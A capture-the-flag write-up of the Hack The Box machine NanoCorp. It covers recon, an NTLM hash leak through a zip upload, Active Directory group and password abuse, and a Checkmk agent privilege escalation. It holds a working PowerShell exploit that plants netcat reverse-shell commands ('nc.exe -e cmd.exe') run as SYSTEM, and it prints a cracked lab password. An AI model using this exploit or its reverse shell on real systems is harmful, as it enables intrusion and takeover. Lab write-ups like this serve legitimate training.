---
title: 'HTB-NanoCorp'
published: 2025-09-18
draft: false
toc: true
---
**Start 08:22 12-11-2025**

---
```
Scope:
10.10.11.93
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -Pn -T5 -vvvv --min-rate=5000 10.10.11.93

PORT     STATE SERVICE           REASON  VERSION
53/tcp   open  domain            syn-ack Simple DNS Plus
80/tcp   open  http              syn-ack Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: Nanocorp
88/tcp   open  kerberos-sec      syn-ack Microsoft Windows Kerberos (server time: 2025-11-12 14:23:30Z)
135/tcp  open  msrpc             syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack
464/tcp  open  kpasswd5?         syn-ack
593/tcp  open  ncacn_http        syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack
3268/tcp open  ldap              syn-ack Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack
5986/tcp open  ssl/http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Issuer: commonName=dc01.nanocorp.htb
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2025-11-12T14:23:43
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22381/tcp): CLEAN (Timeout)
|   Check 2 (port 20267/tcp): CLEAN (Timeout)
|   Check 3 (port 64929/udp): CLEAN (Timeout)
|   Check 4 (port 35963/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## 80/TCP - HTTP

![](attachments/4c0475217094f8f0f5e4597784536bf4.png)

By clicking on **About Us** it takes us to a subdomain:

![](attachments/b6ffbd45c1f90654747c7173985a44cb.png)
![](attachments/548ad75367d3c8b355879482249581d9.png)

### hire.nanocorp.htb

![](attachments/d3fa355dbba07a50066c73383fed1d40.png)

I created the following `.zip` file by combining some files and tested the File Upload functionality:

![](attachments/c7ba5d95e8108bb11234d2f7ea738bd5.png)

![](attachments/55881ab53f0874e9e06006fb8fdf22e7.png)

![](attachments/513867ede60f7b87b9d852d70cd15e89.png)

I checked out the request via `burp`:

![](attachments/ffdc04b98826f8ca00526aa3186bebbe.png)

I then ran a `gobuster` scan in order to enumerate the possible upload location:

![](attachments/42842a5561ad188ca2615795d62d92b2.png)

It seems that there's a `/uploads` directory but it shows up as `403 FORBIDDEN`.

![](attachments/28fd21926fd8202e4f831d3cda32159d.png)

We are in fact unable to reach our uploaded `testing.zip` file.

### CVE-2025-24071

Looking around I was able to find a PoC which looked promising for this exact scenario:

![](attachments/ed9b228cffaabdeb484eec683b569c8d.png)

Looking further I was able to find this [github page](https://github.com/0x6rss/CVE-2025-24071_PoC) which linked to [this blog post](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html) on how to exploit it:

![](attachments/6d24a6eef556dde79717d043ee8350f9.png)

![](attachments/e39d89a6211694d5977f6dc1884c5f5d.png)

![](attachments/f93f6bafdb898353bb891a387a2b5c60.png)

It looks pretty straight forward, let's download over the PoC script.

# Exploitation
## PoC

![](attachments/9361f59e699cb272e5a840f04fa0c3fc.png)

Now I just had to run `responder` and upload the zip file.

![](attachments/e8bd699405eee299853933c8c8e3725d.png)

![](attachments/68c3789806aba6d3909a68e56443d002.png)

![](attachments/4bd0e6e1211e79c28e70cd59301ff971.png)

## john

This hash can easily be cracked using `john`:

![](attachments/5d664eee5b636a429aed2d5d0b57e912.png)

```
web_svc
dksehdgh712!@#
```

## Enumeration
### nxc

Using `nxc` I started enumerating the target:

![](attachments/ef66607fec2a42e4e5e13556f1688edc.png)

![](attachments/1f0a96860f1cc10a55f8a283d249655d.png)

Nothing notable was found within the shares.

![](attachments/14c602c71ccff16247dc0a1dae73836b.png)

Using the above I was able to enumerate 1 other user present called *monitoring_svc*.

## BloodHound

I then went ahead and started enumerating via `bloodhound-ce`:

![](attachments/301ab6795fed3b9ed5025842cf43c4d4.png)

![](attachments/18ec8a612013a88780cc0273c60886d6.png)

The path here looked pretty straightforward:

![](attachments/f917c9a5c8f386f30586a8e1c46633fe.png)

### AddSelf

Using `bloodyAD` I was able to add the *web_svc* user to the **IT_SUPPORT** group:

![](attachments/ff1f1a5381741dd54509bd60399dffea.png)

### ForceChangePassword

Next up I used `bloodyAD` again to change the password of the *monitoring_svc* user:

![](attachments/7909bfcada1052156a6a1b35e01581bf.png)

Although the password change worked `nxc` showed an error:

![](attachments/08b8ce821ee136c0594c7e98572c2b39.png)

This is because the *monitoring_svc* user is part of the **PROTECTED USERS** group:

![](attachments/1efeb95d891509fb03324aaa8838d06b.png)

### impacket-getTGT

After a reset I used the following commands to get the kerberos TGT

![](attachments/d2631a8feb76988e038a337d193924e3.png)

>[!important]
>The TGT is needed in order to log in since **PROTECTED USERS** blocks any and all `ntlm` login attempts.

The following had to be changed within the `/etc/krb5.conf` file:

![](attachments/b0887d9ae9976ef7ead0b4d9bb0fd5f9.png)

![](attachments/343bb90e42ed01d3fea61a1c548c0a6a.png)

I was now able to export the `.ccache` file:

![](attachments/396b89018189a7a0613b6b9336908915.png)

# Foothold
## 5986/TCP - winrms

>[!important]
>For the below I had to install `evil-winrm-py` to get it to work. This can be done using `pipx install 'evil-winrm-py[kerberos]'`

![](attachments/ec5b14e998091f115de60552ef922970.png)

### user.txt

![](attachments/fd5b69b1b17955459bef0775b1572e43.png)

## Enumeration

It was time to start enumerating the user and the host.

![](attachments/41afe3f876f487f2103277a5968faf27.png)

I then ran some automated enum:

![](attachments/05c0f0fec0b69ee6fa7962dd8242f56e.png)

The following was found, unknown whether this would prove useful though.

![](attachments/e1243137004be0d927490eaf3ffc9be0.png)

![](attachments/28feb74f2e743c412ac8fdfdd54ad003.png)

Other than that nothing was really found using `winpeas` here.

# Privilege Escalation
## CVE-2024-0670 - Check_mk_agent

>[!note]
>My shell dropped and I couldn't reconnect via `evil-winrm-py` so I looked for yet another solution
>![](attachments/83794582c239017103eb9d1ca4c18fbf.png)

![](attachments/674f7424be3b9d634520e730b158de4c.png)

After doing some searching I found [the following blog post](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/):

![](attachments/3786e883c986b50d5c9f26de4e02e5ba.png)

This blog also contained the PoC:

![](attachments/59e4d432d688cabe3348bbf470e18ce4.png)

>[!quote]+
>In some cases, the software creates temporary files inside the directory C:\Windows\Temp that get executed afterwards. An attacker can leverage this to place write-protected malicious files in the directory beforehand. The files get executed by Checkmk with SYSTEM privileges allowing attackers to escalate their privileges.

### Attack chain

In order to exploit this CVE we'll have to use the following commands.

1. Copy over the `runascs.exe` binary:

![](attachments/d499fbd8c16f4a60af97060732391c48.png)

![](attachments/de6ba7d9000461d137f63beca85dce44.png)

2. For this step we'll have to download over the `nc.exe` binary, but it needs to be placed inside the `C:\Windows\Temp` directory:

![](attachments/3e0d0773f64e8b703423053d9140fe43.png)

3. Next up we will create a script called `shell.ps1` which will exploit the **Check_mk_agent**:

```powershell
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.14.42", # CHANGE THIS
    [string]$LPORT = "80" # CHANGE THIS AS WELL
)

# 1. Define the malicious batch payload
$NcPath = "C:\Windows\Temp\nc.exe"
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

# 2. Find the MSI trigger
$msi = (
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
    Where-Object { $_.DisplayName -like '*mk*' } |
    Select-Object -First 1
).LocalPackage

if (!$msi) {
    Write-Error "Could not find Checkmk MSI"
    return
}

Write-Host "[*] Found MSI at $msi"

# 3. Spray the Read-Only files
Write-Host "[*] Seeding $MinPID to $MaxPID..."

foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {

        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"

        try {
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        }
        catch {
            # 123
        }
    }
}

Write-Host "[*] Seeding complete."

# 4. Launch the trigger
Write-Host "[*] Triggering MSI repair..."
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait

Write-Host "[*] Trigger sent. Check listener."
```

This script get's transfered over to the target and a listener is launched.

![](attachments/ee7028d0dfd0e2db0a2c2653455de0d9.png)

![](attachments/815727edbca4c55a20ed332d6d07f92a.png)

4. Copy the file to `C:\Windows\Temp` and run the following commands

```powershell
copy shell.ps1 C:\Windows\Temp\shell.ps1

.\runascs.exe web_svc 'dksehdgh712!@#' â€œC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -E
xecutionPolicy Bypass -File C:\Windows\Temp\shell.ps1â€
```

![](attachments/555bca2e4c130df6c07ad1c648c072da.png)

5. Profit

![](attachments/3c427be9b0f7086fb791280dabea10d2.png)

#### root.txt

![](attachments/773516ab4c9f697e51d582fa392c3cd3.png)

![](attachments/666c68b659aa4709c316508db594d91d.png)

---

**Finished 09:51 14-11-2025**

[^Links]: [[Hack The Box]]

#winrms #CVE-2025-24071 #CVE-2024-0670 #AddSelf #forcechangepassword #impacket 
